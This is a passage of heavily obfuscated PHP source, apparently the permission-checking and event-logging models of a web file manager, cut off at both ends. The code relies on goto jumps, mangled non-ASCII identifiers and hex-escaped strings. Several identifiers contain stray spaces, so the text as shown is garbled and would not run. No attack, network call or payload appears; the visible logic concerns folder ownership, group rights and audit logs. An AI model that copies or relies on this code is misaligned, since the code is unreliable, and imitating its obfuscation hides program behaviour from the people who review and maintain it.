$this->field($AôáÅß«¡)->where($BÕ×‰Ù˜œù)->select(); $AÔÂ¬Ó‡¯ = array_to_keyvalue_group($AÔÂ¬Ó‡¯, $aŒµ„¹–Ê[369]); goto E“Š®ÂâØ; D¹ÇÌÎ Ú™: $aŒµ„¹–Ê =& $_SERVER[Î¿—”òá]; if (!$d³Îœİ·‹) { return array(); } $fºÉˆŠÔ†Ë = Model($aŒµ„¹–Ê[1110]); goto aù†áÎôá¡; F‹±ïù‰íğ: } public function authDeepCheck($a†ŠËôŒÙÍ) { goto F‚šÇÒÚ„’; F‚šÇÒÚ„’: $dğ¿Å³°¥¨ =& $_SERVER[Î¿—”òá]; if (_get($GLOBALS, $dğ¿Å³°¥¨[457])) { return !1; } $C˜¢ƒ¥•Üª = $this->makeAuthDeep(); goto DŸ¿—¸©¥ò; e‡ùÀÓ£ĞË: $E†ùİìõã = $AØÖ¯ğ™ÖË ? $AØÖ¯ğ™ÖË[0] : $a†ŠËôŒÙÍ; return array($dğ¿Å³°¥¨[377] => -1, $dğ¿Å³°¥¨[418] => array($dğ¿Å³°¥¨[385] => $dğ¿Å³°¥¨[1024], $dğ¿Å³°¥¨[2103] => $dğ¿Å³°¥¨[468], $dğ¿Å³°¥¨[386] => LNG($dğ¿Å³°¥¨[2253]), $dğ¿Å³°¥¨[2115] => $dğ¿Å³°¥¨[2254]), $dğ¿Å³°¥¨[2255] => array($dğ¿Å³°¥¨[388] => $dğ¿Å³°¥¨[2256], $dğ¿Å³°¥¨[75] => $E†ùİìõã)); goto bç£¼ã…°; DŸ¿—¸©¥ò: if (!in_array($a†ŠËôŒÙÍ, $C˜¢ƒ¥•Üª[$dğ¿Å³°¥¨[2251]])) { return !1; } $AØÖ¯ğ™ÖË = array(); foreach ($C˜¢ƒ¥•Üª[$dğ¿Å³°¥¨[2252]] as $D¬ˆƒíÚ¥ => $Dæ½Ç–Ñ»¹) { if (!in_array($a†ŠËôŒÙÍ, $Dæ½Ç–Ñ»¹)) { continue; } $AØÖ¯ğ™ÖË[] = $D¬ˆƒíÚ¥; } goto e‡ùÀÓ£ĞË; bç£¼ã…°: } protected function makeAuthDeep() { goto dä‚Ï×÷÷ª; fÓèôÄÙö‘: $c¯¨¯÷„¸® = array_to_keyvalue($F³æŸ¬å–‚, $BÃ›öàÔç[33], $BÃ›öàÔç[369]); $C¥§ÒßàÉ = array(); $dôæ§Ï±³’ = $cğèğˆ½é; goto Bö‘¶„¦Ã; eå¬ƒ¡°ç: if ($c¯¨¯÷„¸®) { $a¼ğŠŠ°ĞÅ = $d¥Ğ‰‡‡ÓÛ->where(array($BÃ›öàÔç[369] => array($BÃ›öàÔç[384], $c¯¨¯÷„¸®)))->select(); foreach ($a¼ğŠŠ°ĞÅ as $BÓ£Û¿’ôÓ) { $dé¤¥ºÖ = $d¥Ğ‰‡‡ÓÛ->parentLevelArray($BÓ£Û¿’ôÓ[$BÃ›öàÔç[459]]); $C¥§ÒßàÉ = array_merge($C¥§ÒßàÉ, $dé¤¥ºÖ); $dôæ§Ï±³’[] = $BÓ£Û¿’ôÓ[$BÃ›öàÔç[456]]; $BôµÒ£‘éµ[$BÓ£Û¿’ôÓ[$BÃ›öàÔç[369]]] = $dé¤¥ºÖ; $e”ƒ¿¶¬Ø¤[$BÓ£Û¿’ôÓ[$BÃ›öàÔç[369]]] = $BÓ£Û¿’ôÓ[$BÃ›öàÔç[456]]; } } $dôæ§Ï±³’ = array_values(array_unique($dôæ§Ï±³’)); $EàÍŒ„‚ôÙ = $dôæ§Ï±³’; goto FœŒÔ×Œô–; e«Ø¬¿ÊŸæ: $cğèğˆ½é = Session::get($BÃ›öàÔç[2212]); $cğèğˆ½é = array_to_keyvalue($cğèğˆ½é, $BÃ›öàÔç[33], $BÃ›öàÔç[2097]); $A¦ò†×Öó = array($BÃ›öàÔç[371] => SourceModel::TYPE_USER, $BÃ›öàÔç[456] => USER_ID); goto DˆÓƒáÂ›; fƒ³”£™…¿: foreach ($BôµÒ£‘éµ as $CÖ‘ÑÓ„¾ª => $F¼°«¼‰õ) { $Bñé¦Ä’“ã = $e”ƒ¿¶¬Ø¤[$CÖ‘ÑÓ„¾ª]; if (!$Bñé¦Ä’“ã || !$F…†¸“¦«ó[$Bñé¦Ä’“ã]) { continue; } $AƒÅÇµçé = array(); foreach ($BµÉ‹É“š»[$Bñé¦Ä’“ã] as $AÍöÕËØÌ) { $AƒÅÇµçé[] = $F…†¸“¦«ó[$AÍöÕËØÌ]; } $BôµÒ£‘éµ[$CÖ‘ÑÓ„¾ª] = array_merge($AƒÅÇµçé, $F¼°«¼‰õ); } $C¥§ÒßàÉ = array_values(array_unique($C¥§ÒßàÉ)); $AŞß‚Ù¡•œ = array($BÃ›öàÔç[2251] => $C¥§ÒßàÉ, $BÃ›öàÔç[2252] => $BôµÒ£‘éµ); goto E½¶ ÉÖèÓ; FÉÂ¼„óà: $e÷Õ†â¯Œ¹ = Model($BÃ›öàÔç[2257])->listData(); $DÇŒØ±êÁ„ = array(); foreach ($e÷Õ†â¯Œ¹ as $A Í§Ÿ§Ç²) { if ($A Í§Ÿ§Ç²[$BÃ›öàÔç[376]] == 0 && $A Í§Ÿ§Ç²[$BÃ›öàÔç[2117]] == $BÃ›öàÔç[83]) { $DÇŒØ±êÁ„[] = $A Í§Ÿ§Ç²[$BÃ›öàÔç[367]]; } } goto e«Ø¬¿ÊŸæ; dä‚Ï×÷÷ª: $BÃ›öàÔç =& $_SERVER[Î¿—”òá]; static $AŞß‚Ù¡•œ = false; if ($AŞß‚Ù¡•œ) { return $AŞß‚Ù¡•œ; } goto FÉÂ¼„óà; d‘ÆÀÛ¼¯ò: $e”ƒ¿¶¬Ø¤ = array(); $F…†¸“¦«ó = array(); $BµÉ‹É“š» = array(); goto eå¬ƒ¡°ç; DˆÓƒáÂ›: if ($cğèğˆ½é) { $A¦ò†×Öó = array(array($BÃ›öàÔç[371] => SourceModel::TYPE_USER, $BÃ›öàÔç[456] => USER_ID), array($BÃ›öàÔç[371] => SourceModel::TYPE_GROUP, $BÃ›öàÔç[456] => array($BÃ›öàÔç[384], $cğèğˆ½é)), $BÃ›öàÔç[907] => $BÃ›öàÔç[2179]); } if ($DÇŒØ±êÁ„) { $A¦ò†×Öó = array($A¦ò†×Öó, $BÃ›öàÔç[2228] => array($BÃ›öàÔç[2258], $DÇŒØ±êÁ„)); } $F³æŸ¬å–‚ = $this->field($BÃ›öàÔç[2259])->where($A¦ò†×Öó)->select(); goto fÓèôÄÙö‘; FœŒÔ×Œô–: foreach ($EàÍŒ„‚ôÙ as $AÍöÕËØÌ) { $F©…¹˜˜İŒ = $Dò‰Åî†Œ½->getInfo($AÍöÕËØÌ); $dé¤¥ºÖ = $d¥Ğ‰‡‡ÓÛ->parentLevelArray($F©…¹˜˜İŒ[$BÃ›öàÔç[459]]); $dôæ§Ï±³’ = array_merge($dôæ§Ï±³’, $dé¤¥ºÖ); } $dôæ§Ï±³’ = array_values(array_unique($dôæ§Ï±³’)); foreach ($dôæ§Ï±³’ as $AÍöÕËØÌ) { $F©…¹˜˜İŒ = $Dò‰Åî†Œ½->getInfo($AÍöÕËØÌ); $C¥§ÒßàÉ[] = $F©…¹˜˜İŒ[$BÃ›öàÔç[391]][$BÃ›öàÔç[369]]; $F…†¸“¦«ó[$AÍöÕËØÌ] = $F©…¹˜˜İŒ[$BÃ›öàÔç[391]][$BÃ›öàÔç[369]]; $BµÉ‹É“š»[$AÍöÕËØÌ] = $d¥Ğ‰‡‡ÓÛ->parentLevelArray($F©…¹˜˜İŒ[$BÃ›öàÔç[459]]); } goto fƒ³”£™…¿; E½¶ ÉÖèÓ: return $AŞß‚Ù¡•œ; goto C¤Ìå¶¹êÁ; Bö‘¶„¦Ã: $d¥Ğ‰‡‡ÓÛ = Model($BÃ›öàÔç[1110]); $Dò‰Åî†Œ½ = Model($BÃ›öàÔç[458]); $BôµÒ£‘éµ = array(); goto d‘ÆÀÛ¼¯ò; C¤Ìå¶¹êÁ: } private function makeSourceAuth($F¿‡İƒ™Û¨, $fÅã½¸“óÂ) { goto B‡Àã¾Ø„‰; B‚¯ÏåÄ¢: $Fòç´ˆÉ‘ß = $F¿‡İƒ™Û¨[$a¸¡¦ÇÑ²[456]]; $B…·˜ä­¤ø = $F¿‡İƒ™Û¨[$a¸¡¦ÇÑ²[371]] == SourceModel::TYPE_GROUP; if ($B…·˜ä­¤ø && isset($AíŞ¥¹¶¬Ö[$Fòç´ˆÉ‘ß]) && !_get($GLOBALS, $a¸¡¦ÇÑ²[457])) { $bÆÈˆÉ÷×œ = $AíŞ¥¹¶¬Ö[$Fòç´ˆÉ‘ß]; if (Model($a¸¡¦ÇÑ²[2247])->authCheckRoot($bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]][$a¸¡¦ÇÑ²[376]])) { $c›îÙºÆãÙ = Model($a¸¡¦ÇÑ²[458])->getInfo($Fòç´ˆÉ‘ß); $A¡ÒĞ¼Ñ—Í = array($a¸¡¦ÇÑ²[2260] => intval($bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]][$a¸¡¦ÇÑ²[376]]), $a¸¡¦ÇÑ²[2261] => $bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]], $a¸¡¦ÇÑ²[2255] => array($a¸¡¦ÇÑ²[388] => $a¸¡¦ÇÑ²[2262], $a¸¡¦ÇÑ²[2263] => $c›îÙºÆãÙ[$a¸¡¦ÇÑ²[391]][$a¸¡¦ÇÑ²[369]], $a¸¡¦ÇÑ²[2264] => $c›îÙºÆãÙ[$a¸¡¦ÇÑ²[463]])); return $A¡ÒĞ¼Ñ—Í; } } goto cÌó‰‡•½„; aœ÷Ù¾­®: return $A¡ÒĞ¼Ñ—Í; goto BªÌ‹íƒ”Ø; D¾¤Óµ¼Ú: if (!$A¡ÒĞ¼Ñ—Í && isset($AíŞ¥¹¶¬Ö[$Fòç´ˆÉ‘ß])) { $bÆÈˆÉ÷×œ = $AíŞ¥¹¶¬Ö[$Fòç´ˆÉ‘ß]; $c›îÙºÆãÙ = Model($a¸¡¦ÇÑ²[458])->getInfo($Fòç´ˆÉ‘ß); $A¡ÒĞ¼Ñ—Í = array($a¸¡¦ÇÑ²[2260] => intval($bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]][$a¸¡¦ÇÑ²[376]]), $a¸¡¦ÇÑ²[2261] => $bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]], $a¸¡¦ÇÑ²[2255] => array($a¸¡¦ÇÑ²[388] => $a¸¡¦ÇÑ²[2265], $a¸¡¦ÇÑ²[75] => $c›îÙºÆãÙ[$a¸¡¦ÇÑ²[391]][$a¸¡¦ÇÑ²[369]], $a¸¡¦ÇÑ²[2264] => $c›îÙºÆãÙ[$a¸¡¦ÇÑ²[463]])); } if (!$A¡ÒĞ¼Ñ—Í) { $c›îÙºÆãÙ = Model($a¸¡¦ÇÑ²[458])->getInfo($Fòç´ˆÉ‘ß); $aÕ¦Ğ©êİñ = explode($a¸¡¦ÇÑ²[47], trim($c›îÙºÆãÙ[$a¸¡¦ÇÑ²[459]], $a¸¡¦ÇÑ²[47])); foreach ($aÕ¦Ğ©êİñ as $C•ŸØ•‰) { if ($C•ŸØ•‰ == $a¸¡¦ÇÑ²[468] || $C•ŸØ•‰ == $F©Æ•ˆ±›ó) { continue; } if (!isset($AíŞ¥¹¶¬Ö[$C•ŸØ•‰])) { continue; } $bÆÈˆÉ÷×œ = $AíŞ¥¹¶¬Ö[$C•ŸØ•‰]; $A¡ÒĞ¼Ñ—Í = array($a¸¡¦ÇÑ²[2260] => intval($bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]][$a¸¡¦ÇÑ²[376]]), $a¸¡¦ÇÑ²[2261] => $bÆÈˆÉ÷×œ[$a¸¡¦ÇÑ²[376]], $a¸¡¦ÇÑ²[2255] => array($a¸¡¦ÇÑ²[388] => $a¸¡¦ÇÑ²[2262], $a¸¡¦ÇÑ²[2263] => $c›îÙºÆãÙ[$a¸¡¦ÇÑ²[391]][$a¸¡¦ÇÑ²[369]], $a¸¡¦ÇÑ²[2264] => $c›îÙºÆãÙ[$a¸¡¦ÇÑ²[463]])); break; } } if (!$A¡ÒĞ¼Ñ—Í || $A¡ÒĞ¼Ñ—Í[$a¸¡¦ÇÑ²[377]] <= 0) { $dĞÕè¶”Ê = $this->authDeepCheck($F¿‡İƒ™Û¨[$a¸¡¦ÇÑ²[369]]); if ($dĞÕè¶”Ê) { $A¡ÒĞ¼Ñ—Í = $dĞÕè¶”Ê; } } goto aœ÷Ù¾­®; B‡Àã¾Ø„‰: $a¸¡¦ÇÑ² =& $_SERVER[Î¿—”òá]; $AíŞ¥¹¶¬Ö = Session::get($a¸¡¦ÇÑ²[2212]); $AíŞ¥¹¶¬Ö = array_to_keyvalue($AíŞ¥¹¶¬Ö, $a¸¡¦ÇÑ²[2097]); goto b½Íñ‘ªô¬; b½Íñ‘ªô¬: $F©Æ•ˆ±›ó = $a¸¡¦ÇÑ²[83]; $bÈÒª†ççØ = Model($a¸¡¦ÇÑ²[1110])->parentLevelArray($F¿‡İƒ™Û¨[$a¸¡¦ÇÑ²[459]]); $bÈÒª†ççØ = array_merge(array($F¿‡İƒ™Û¨[$a¸¡¦ÇÑ²[369]]), array_reverse($bÈÒª†ççØ)); goto B‚¯ÏåÄ¢; cÌó‰‡•½„: $A¡ÒĞ¼Ñ—Í = !1; foreach ($bÈÒª†ççØ as $FÔŞ†àˆêš) { if (!isset($fÅã½¸“óÂ[$FÔŞ†àˆêš])) { continue; } $a†…Ø§Šêä = $this->authMake($fÅã½¸“óÂ[$FÔŞ†àˆêš]); if ($a†…Ø§Šêä[$a¸¡¦ÇÑ²[418]]) { $A¡ÒĞ¼Ñ—Í = $a†…Ø§Šêä; break; } } if (!$B…·˜ä­¤ø) { return $A¡ÒĞ¼Ñ—Í; } goto D¾¤Óµ¼Ú; BªÌ‹íƒ”Ø: } public function authOwnerApply($eëñ¸õ…––) { goto dîİ‹ãÄØò; BØ¹‡ÔŒîÔ: $F´“î»Ëò = Model($Cë‡¯¤ÕŸ™[1110])->parentLevelArray($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[459]]); $F´“î»Ëò = array_merge(array($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[369]]), array_reverse($F´“î»Ëò)); $Fì¸¶à«©‹ = $Cë‡¯¤ÕŸ™[2250]; goto cÖ„·ÏŠ; dîİ‹ãÄØò: $Cë‡¯¤ÕŸ™ =& $_SERVER[Î¿—”òá]; if (empty($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[376]]) || isset($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[2266]]) && $eëñ¸õ…––[$Cë‡¯¤ÕŸ™[2266]]) { return $eëñ¸õ…––; } if (AuthModel::authCheckRoot($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[376]][$Cë‡¯¤ÕŸ™[377]])) { return $eëñ¸õ…––; } goto BØ¹‡ÔŒîÔ; cÖ„·ÏŠ: $fåÂ®èŞì = array($Cë‡¯¤ÕŸ™[383] => array($Cë‡¯¤ÕŸ™[384], $F´“î»Ëò)); $f…ºÄ…¾ëë = $this->field($Fì¸¶à«©‹)->where($fåÂ®èŞì)->select(); $f…ºÄ…¾ëë = array_to_keyvalue_group($f…ºÄ…¾ëë, $Cë‡¯¤ÕŸ™[369]); goto dªàÕô‹ì¿; BñæµùÚÏÅ: if (count($eêñÌ¹ÊÔ) == 0) { $eêñÌ¹ÊÔ = $this->authFolderOwnerGroup($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[456]]); } $eêñÌ¹ÊÔ = array_unique($eêñÌ¹ÊÔ); if (AuthModel::authCheckRoot($eëñ¸õ…––[$Cë‡¯¤ÕŸ™[376]][$Cë‡¯¤ÕŸ™[377]])) { $eêñÌ¹ÊÔ[] = USER_ID; } goto fÃ¦ƒ¢¢³™; fÃ¦ƒ¢¢³™: $eëñ¸õ…––[$Cë‡¯¤ÕŸ™[376]][$Cë‡¯¤ÕŸ™[2268]] = Model($Cë‡¯¤ÕŸ™[474])->userListInfo($eêñÌ¹ÊÔ); return $eëñ¸õ…––; goto a†…ÌÈŠ²; dªàÕô‹ì¿: $Eèô„¥áÃ“ = array(); $eêñÌ¹ÊÔ = array(); foreach ($f…ºÄ…¾ëë as $FÆ´±‚Ì™ => $Fæë¬ÒĞ³) { $dŞº¬‹¢×³ = $this->authFolderOwnerUser($Fæë¬ÒĞ³); $Eèô„¥áÃ“[$FÆ´±‚Ì™] = $dŞº¬‹¢×³; $eêñÌ¹ÊÔ = array_merge($eêñÌ¹ÊÔ, $dŞº¬‹¢×³[$Cë‡¯¤ÕŸ™[535]]); if ($dŞº¬‹¢×³[$Cë‡¯¤ÕŸ™[2267]]) { break; } } goto BñæµùÚÏÅ; a†…ÌÈŠ²: } private function authFolderOwnerGroup($Bè¡Ó¼ì°) { $fÙè£§Î  =& $_SERVER[Î¿—”òá]; $BÄ­œŒ‚…‡ = Model($fÙè£§Î [2173])->where(array($fÙè£§Î [2097] => $Bè¡Ó¼ì°))->select(); $Dí±ïóÓ‹Ú = array(); if (!$BÄ­œŒ‚…‡) { return $Dí±ïóÓ‹Ú; } foreach ($BÄ­œŒ‚…‡ as $FáÌÊ‰ÕÖ) { $E÷Şã Ë„ã = $this->authInfo($FáÌÊ‰ÕÖ); if (AuthModel::authCheckRoot($E÷Şã Ë„ã[$fÙè£§Î [376]])) { $Dí±ïóÓ‹Ú[] = $FáÌÊ‰ÕÖ[$fÙè£§Î [1429]]; } } return $Dí±ïóÓ‹Ú; } private function authFolderOwnerUser($EèÙÌ¸íöÒ) { $BÇ”Ô¤º‡İ =& $_SERVER[Î¿—”òá]; $EŞï‡‘ÜŠÇ = array(); $dƒ¥ø¿“ğÆ = !1; foreach ($EèÙÌ¸íöÒ as $d‡¼‹™¯Ìò) { $e¥ŞÕ„®Ö = $this->authInfo($d‡¼‹™¯Ìò); if ($d‡¼‹™¯Ìò[$BÇ”Ô¤º‡İ[456]] == $BÇ”Ô¤º‡İ[468]) { $dƒ¥ø¿“ğÆ = !0; } if ($d‡¼‹™¯Ìò[$BÇ”Ô¤º‡İ[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($e¥ŞÕ„®Ö[$BÇ”Ô¤º‡İ[376]])) { $EŞï‡‘ÜŠÇ[] = $d‡¼‹™¯Ìò[$BÇ”Ô¤º‡İ[456]]; } } } return array($BÇ”Ô¤º‡İ[535] => $EŞï‡‘ÜŠÇ, $BÇ”Ô¤º‡İ[2267] => $dƒ¥ø¿“ğÆ); } public function authMake($fºÉºŠ’Ã) { goto A…¬‹ÛïÅ‘; A…¬‹ÛïÅ‘: $cîˆ÷µ—°Û =& $_SERVER[Î¿—”òá]; if (!$fºÉºŠ’Ã) { return array($cîˆ÷µ—°Û[377] => 0, $cîˆ÷µ—°Û[418] => !1); } $bñ©´Š‘¥ = Session::get($cîˆ÷µ—°Û[2212]); goto aí±‚ˆ½è; eğ¤¿ßá¤ø: $eË­ò…ë© = $B‰´Ş÷ôğŸ ? $A°óÃÚÇ : ($DßäçøêÛî ? $C”Ä‰æöñ : $e¡ÄÁŠµãÆ); $B×Ì¡Ö§Ñ‚ = $B‰´Ş÷ôğŸ ? $d‡ßàÀñŸ‡ : ($DßäçøêÛî ? $b¯ÂÆÃÊ“ : $BìøÒèìßÔ); $fÂ‡ÊÒ‚Ä» = $B‰´Ş÷ôğŸ ? $cîˆ÷µ—°Û[2269] : ($DßäçøêÛî ? $cîˆ÷µ—°Û[2270] : ($A‚·â‡™Ä ? $cîˆ÷µ—°Û[2271] : $cîˆ÷µ—°Û[361])); goto C¥ ›®ù®Ÿ; díšÒàÏğ÷: $A‚·â‡™Ä = 0; $eĞ¥¥åïØ‰ = array($cîˆ÷µ—°Û[369] => 0); foreach ($fºÉºŠ’Ã as $eĞ¥¥åïØ‰) { $B×Ì¡Ö§Ñ‚ = $this->authInfo($eĞ¥¥åïØ‰); $C«ø™…îµ = $eĞ¥¥åïØ‰[$cîˆ÷µ—°Û[456]]; $c„²š»×é› = intval($B×Ì¡Ö§Ñ‚[$cîˆ÷µ—°Û[376]]); if ($eĞ¥¥åïØ‰[$cîˆ÷µ—°Û[371]] == SourceModel::TYPE_USER && $C«ø™…îµ == USER_ID) { $B‰´Ş÷ôğŸ = !0; $d‡ßàÀñŸ‡ = $B×Ì¡Ö§Ñ‚; $A°óÃÚÇ = $c„²š»×é›; } else { if ($eĞ¥¥åïØ‰[$cîˆ÷µ—°Û[371]] == SourceModel::TYPE_GROUP && in_array($C«ø™…îµ, $F¥ê¸‰Ûã®)) { $DßäçøêÛî = !0; if ($c„²š»×é› >= $C”Ä‰æöñ) { $C”Ä‰æöñ = $c„²š»×é›; $b¯ÂÆÃÊ“ = $B×Ì¡Ö§Ñ‚; } } else { if ($C«ø™…îµ == $cîˆ÷µ—°Û[468]) { $A‚·â‡™Ä = !0; $BìøÒèìßÔ = $B×Ì¡Ö§Ñ‚; $e¡ÄÁŠµãÆ = $c„²š»×é›; } } } } goto eğ¤¿ßá¤ø; aí±‚ˆ½è: $F¥ê¸‰Ûã® = array_to_keyvalue($bñ©´Š‘¥, $cîˆ÷µ—°Û[33], $cîˆ÷µ—°Û[2097]); $A°óÃÚÇ = 0; $C”Ä‰æöñ = 0; goto AÖ—ÄÌ¡ãÍ; AÖ—ÄÌ¡ãÍ: $e¡ÄÁŠµãÆ = 0; $d‡ßàÀñŸ‡ = 0; $b¯ÂÆÃÊ“ = 0; goto a´™î«Ï¸«; a´™î«Ï¸«: $BìøÒèìßÔ = 0; $B‰´Ş÷ôğŸ = 0; $DßäçøêÛî = 0; goto díšÒàÏğ÷; C¥ ›®ù®Ÿ: $Eù¸Ü³Ú’² = array($cîˆ÷µ—°Û[2260] => intval($eË­ò…ë©), $cîˆ÷µ—°Û[2261] => $B×Ì¡Ö§Ñ‚, $cîˆ÷µ—°Û[2255] => array($cîˆ÷µ—°Û[388] => $fÂ‡ÊÒ‚Ä», $cîˆ÷µ—°Û[75] => $eĞ¥¥åïØ‰[$cîˆ÷µ—°Û[369]])); return $Eù¸Ü³Ú’²; goto Eø³¯Ø¤’; Eø³¯Ø¤’: } public function authTargetInfoMake($d³êõÙ„) { goto DÕ˜„¨ÖæË; DÕ˜„¨ÖæË: $B‘¸Ÿñæó– =& $_SERVER[Î¿—”òá]; $D˜Ç”øİ»Ò = array(); $E‘«‚ = array(); goto CäóñÓ†ì; CÙÆ‡Í´ñ: return array($B‘¸Ÿñæó–[2272] => $D˜Ç”øİ»Ò, $B‘¸Ÿñæó–[2264] => $E‘«‚); goto fçĞ‚«Ôë; CäóñÓ†ì: foreach ($d³êõÙ„ as $d’¼ù“ÔßÈ) { if ($d’¼ù“ÔßÈ[$B‘¸Ÿñæó–[371]] == SourceModel::TYPE_USER) { $D˜Ç”øİ»Ò[] = intval($d’¼ù“ÔßÈ[$B‘¸Ÿñæó–[456]]); } else { if ($d’¼ù“ÔßÈ[$B‘¸Ÿñæó–[371]] == SourceModel::TYPE_GROUP) { $E‘«‚[] = intval($d’¼ù“ÔßÈ[$B‘¸Ÿñæó–[456]]); } } } if ($D˜Ç”øİ»Ò) { $D˜Ç”øİ»Ò = Model($B‘¸Ÿñæó–[474])->userListInfo($D˜Ç”øİ»Ò); } if ($E‘«‚) { $B´·²ƒ›Ù = array($B‘¸Ÿñæó–[2171] => array($B‘¸Ÿñæó–[384], $E‘«‚)); $E‘«‚ = Model($B‘¸Ÿñæó–[458])->field($B‘¸Ÿñæó–[2184])->where($B´·²ƒ›Ù)->select(); $E‘«‚ = array_to_keyvalue($E‘«‚, $B‘¸Ÿñæó–[2097]); } goto CÙÆ‡Í´ñ; fçĞ‚«Ôë: } private function authInfo($eµ¦Ó”Ã£) { $C¦ˆ¶Ìø« =& $_SERVER[Î¿—”òá]; if ($eµ¦Ó”Ã£[$C¦ˆ¶Ìø«[2228]]) { $AÌàË½³ÚÂ = Model($C¦ˆ¶Ìø«[2247])->listData($eµ¦Ó”Ã£[$C¦ˆ¶Ìø«[2228]]); if (!$AÌàË½³ÚÂ) { return !1; $D‹ŞÀâòí  = Model($C¦ˆ¶Ìø«[2247])->listData(); $Dµâ½“Œ¸ì = array_filter_by_field($D‹ŞÀâòí , $C¦ˆ¶Ìø«[376], $C¦ˆ¶Ìø«[468]); return $Dµâ½“Œ¸ì; } $AÎ‰Ûª±Ê = array_field_key($AÌàË½³ÚÂ, array($C¦ˆ¶Ìø«[367], $C¦ˆ¶Ìø«[28], $C¦ˆ¶Ìø«[376], $C¦ˆ¶Ìø«[2115], $C¦ˆ¶Ìø«[2118])); $AÎ‰Ûª±Ê[$C¦ˆ¶Ìø«[2273]] = $eµ¦Ó”Ã£; return $AÎ‰Ûª±Ê; } else { return array($C¦ˆ¶Ìø«[385] => 0, $C¦ˆ¶Ìø«[2103] => $eµ¦Ó”Ã£[$C¦ˆ¶Ìø«[2229]], $C¦ˆ¶Ìø«[386] => $C¦ˆ¶Ìø«[33], $C¦ˆ¶Ìø«[2115] => $C¦ˆ¶Ìø«[2274]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\x5f\163\157\165\162\x63\x65\x5f\x65\166\x65\156\164"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\x69\x6d\145", "\164\151\155\x65", "\x69\156\x73\x65\x72\164", "\x66\x75\x6e\143\164\151\x6f\x6e"), array("\x64\145\163\143", '', "\151\156\x73\x65\x72\164\x2c\165\x70\x64\x61\164\145\54\x73\145\154\x65\x63\164", "\x6a\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($dŒ¿’ÈÒÉÙ, $b÷¼é¾, $B’ò…¬° = '') { goto e†ñ–ÄÛÑ”; e†ñ–ÄÛÑ”: $F¨¼å½‡‰ =& $_SERVER[Î¿—”òá]; if (!$this->eventSave) { return; } $F‰ªàŞ‰Œ‹ = Model($F¨¼å½‡‰[1110])->sourceInfo($dŒ¿’ÈÒÉÙ); goto e˜Ş—›¨ †; e˜Ş—›¨ †: if (!$F‰ªàŞ‰Œ‹) { return !1; } if ($this->isCacheEvent($F‰ªàŞ‰Œ‹, $b÷¼é¾)) { return; } if ($B’ò…¬° && is_string($B’ò…¬°)) { $B’ò…¬° = array($F¨¼å½‡‰[2127] => $B’ò…¬°); } goto Fä˜Ş®¾ëã; Fä˜Ş®¾ëã: $fÜ˜ä›ÛŒ» = array($F¨¼å½‡‰[383] => $dŒ¿’ÈÒÉÙ, $F¨¼å½‡‰[2275] => $F‰ªàŞ‰Œ‹[$F¨¼å½‡‰[461]], $F¨¼å½‡‰[2276] => $F‰ªàŞ‰Œ‹[$F¨¼å½‡‰[28]], $F¨¼å½‡‰[466] => $F‰ªàŞ‰Œ‹[$F¨¼å½‡‰[466]], $F¨¼å½‡‰[1420] => USER_ID, $F¨¼å½‡‰[388] => $b÷¼é¾, $F¨¼å½‡‰[1422] => $B’ò…¬°); $this->addSystemLog($b÷¼é¾, $fÜ˜ä›ÛŒ»); return $this->add($fÜ˜ä›ÛŒ»); goto c¤ô†ˆÅ˜Á; c¤ô†ˆÅ˜Á: } private function addSystemLog($DÍ’ƒĞ“¢, $dá“©Ï„äÁ) { $A„Ûˆµ İ =& $_SERVER[Î¿—”òá]; if ($DÍ’ƒĞ“¢ == $A„Ûˆµ İ[2277]) { $DÍ’ƒĞ“¢ = $dá“©Ï„äÁ[$A„Ûˆµ İ[405]][$A„Ûˆµ İ[2278]]; } else { if (in_array($DÍ’ƒĞ“¢, array($A„Ûˆµ İ[2074], $A„Ûˆµ İ[2279]))) { $DÍ’ƒĞ“¢ = $dá“©Ï„äÁ[$A„Ûˆµ İ[405]][$A„Ûˆµ İ[688]]; } } $d«‘ù¼Æù´ = array_merge($dá“©Ï„äÁ, array($A„Ûˆµ İ[2280] => $dá“©Ï„äÁ[$A„Ûˆµ İ[369]], $A„Ûˆµ İ[2281] => $dá“©Ï„äÁ[$A„Ûˆµ İ[2281]])); Model($A„Ûˆµ İ[2037])->addLog($A„Ûˆµ İ[2282] . $DÍ’ƒĞ“¢, $d«‘ù¼Æù´); } private function isCacheEvent($b¡—ô†Ç, $eŠ™ÉÑ¨¤¼) { if ($b¡—ô†Ç[$_SERVER[Î¿—”òá][371]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($e„ï¯“ãæì, $Aèƒ²Šã¶) { $BÍ¿øñ”ğŒ =& $_SERVER[Î¿—”òá]; $D·Ó±£ˆò‰ = Model($BÍ¿øñ”ğŒ[1110])->sourceInfo($e„ï¯“ãæì); $fåœºàŸœ = array($BÍ¿øñ”ğŒ[2278] => $Aèƒ²Šã¶, $BÍ¿øñ”ğŒ[28] => $D·Ó±£ˆò‰[$BÍ¿øñ”ğŒ[28]]); return $this->addEvent($e„ï¯“ãæì, $BÍ¿øñ”ğŒ[2277], $fåœºàŸœ); } public function eventFileEdit($CËáù¡›…Û) { $f’ª¨à•¡Ì =& $_SERVER[Î¿—”òá]; $c˜š¿»»ô = array($f’ª¨à•¡Ì[2283] => $_SERVER[$f’ª¨à•¡Ì[2284]], $f’ª¨à•¡Ì[1743] => strtolower(ACTION)); return $this->addEvent($CËáù¡›…Û, $f’ª¨à•¡Ì[2064], $c˜š¿»»ô); } public function eventRecycle($eÊßµçö, $FõÛÁå²¦¯) { return $this->addEvent($eÊßµçö, $_SERVER[Î¿—”òá][2279], $FõÛÁå²¦¯); } public function eventRemove($AÀÒæ‡È§) { $DŒ£Ó”¦Î =& 